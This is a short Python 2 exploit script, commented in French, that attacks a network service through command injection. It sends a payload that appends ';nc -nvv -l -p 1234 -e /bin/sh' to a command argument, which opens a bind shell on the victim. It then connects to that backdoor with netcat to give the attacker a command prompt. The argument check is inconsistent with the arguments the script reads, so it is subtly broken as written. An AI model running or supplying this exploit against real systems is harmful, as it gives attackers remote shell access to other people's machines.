#!/usr/bin/env python2
# sploit qui utilise la vuln system pour ouvrir un shell

import socket
import os
import time
import sys

if len(sys.argv) != 2:
   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
   sys.exit(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)


evil  = ";nc -nvv -l -p 1234 -e /bin/sh"
cmdID = "3 "
arg3  = " pown"+evil
arg2  = str(len(arg3))
payload = cmdID + arg2 + arg3

print "[+] Send payload..."
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload"
   sys.exit(1)
print "[+] done!"
print "[+] Waiting backdoor"
time.sleep(3)
concat = "netcat " + sys.argv[1] + " 1234"
print "[+] Connected to the backdoor you can now execute cmd"
os.system(concat)

